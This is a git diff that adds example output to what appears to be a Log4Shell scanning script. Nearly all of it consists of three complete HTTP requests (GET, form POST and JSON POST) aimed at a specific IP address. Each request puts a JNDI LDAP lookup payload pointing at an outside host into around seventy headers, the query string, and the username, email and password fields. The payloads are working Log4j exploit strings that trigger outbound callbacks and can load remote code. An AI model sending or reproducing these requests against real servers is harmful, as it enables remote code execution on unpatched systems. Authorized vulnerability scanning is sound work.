@@ -8,7 +8,7 @@
     do
     echo URL: $i
     
-    rm -Rf headers-large_SPLIT*#
+    rm -Rf headers-large_SPLIT*
     # split up the headers into 69 line files
     split -l 69 headers-large.txt headers-large_SPLITa
     
@@ -35,3 +35,246 @@
 
 
 
+#Example output
+
+    3 request  total 
+    
+    1 get
+    1 post
+    1 post with JSON
+    
+    tests 70 headers but I set it to do 1000 headers over 17 request ;)
+    
+    I tried to convert it to curl but I gave up when I relized the last post is JSON ( Ewwww .... )
+    
+    this is what one looks like with the defalt headers :
+    
+    
+    
+    GET /stuff/?v=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D HTTP/1.1
+    Host: 162.250.190.93
+    User-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Referer: https://${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Api-Version: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Charset: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Datetime: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Language: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Cookie: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-For-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    TE: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    True-Client-IP: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Upgrade: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Via: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Warning: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Max-Forwards: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Origin: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Pragma: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    DNT: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Cache-Control: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-ATT-DeviceId: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Correlation-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Csrf-Token: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-CSRFToken: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Do-Not-Track: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Foo: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Foo-Bar: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-By: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-For-Original: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Host: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Port: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Protocol: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Scheme: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Server: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Ssl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarder-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forward-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forward-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Frame-Options: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Geoip-Country: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Destinationurl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Host-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Method: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-HTTP-Method-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Path-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Https: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Htx-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Hub-Signature: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-If-Unmodified-Since: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Imbo-Test-Config: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Insight: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Ip-Trail: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-ProxyUser-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Requested-With: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Request-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-UIDH: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Wap-Profile: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-XSRF-TOKEN: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    
+    
+    
+    -----------
+    
+    POST /stuff/?v=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D HTTP/1.1
+    Host: 162.250.190.93
+    User-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Referer: https://${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Api-Version: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Charset: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Datetime: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Language: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Cookie: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-For-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    TE: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    True-Client-IP: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Upgrade: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Via: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Warning: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Max-Forwards: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Origin: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Pragma: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    DNT: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Cache-Control: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-ATT-DeviceId: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Correlation-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Csrf-Token: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-CSRFToken: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Do-Not-Track: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Foo: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Foo-Bar: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-By: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-For-Original: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Host: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Port: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Protocol: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Scheme: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Server: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Ssl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarder-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forward-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forward-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Frame-Options: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Geoip-Country: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Destinationurl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Host-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Method: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-HTTP-Method-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Path-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Https: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Htx-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Hub-Signature: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-If-Unmodified-Since: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Imbo-Test-Config: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Insight: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Ip-Trail: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-ProxyUser-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Requested-With: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Request-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-UIDH: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Wap-Profile: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-XSRF-TOKEN: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Content-Length: 387
+    Content-Type: application/x-www-form-urlencoded
+    
+    username=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&user=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&email=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&email_address=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&password=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D
+    
+    
+    ---------
+    
+    POST /stuff/?v=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D HTTP/1.1
+    Host: 162.250.190.93
+    User-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Referer: https://${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Api-Version: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Charset: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Datetime: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Accept-Language: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Cookie: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-For-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    TE: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    True-Client-IP: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Upgrade: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Via: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Warning: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Max-Forwards: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Origin: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Pragma: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    DNT: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Cache-Control: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-ATT-DeviceId: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Correlation-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Csrf-Token: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-CSRFToken: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Do-Not-Track: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Foo: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Foo-Bar: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-By: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-For-Original: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Host: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Port: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Protocol: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Scheme: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Server: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarded-Ssl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forwarder-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forward-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Forward-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Frame-Options: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Geoip-Country: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Destinationurl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Host-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Method: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-HTTP-Method-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Http-Path-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Https: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Htx-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Hub-Signature: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-If-Unmodified-Since: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Imbo-Test-Config: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Insight: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Ip-Trail: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-ProxyUser-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Requested-With: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Request-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-UIDH: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-Wap-Profile: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    X-XSRF-TOKEN: ${jndi:ldap://rmccurdy.com/gfbw2zo}
+    Content-Length: 338
+    Content-Type: application/json
+    
+    {"username": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "user": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "email": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "email_address": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "password": "${jndi:ldap://rmccurdy.com/gfbw2zo}"}
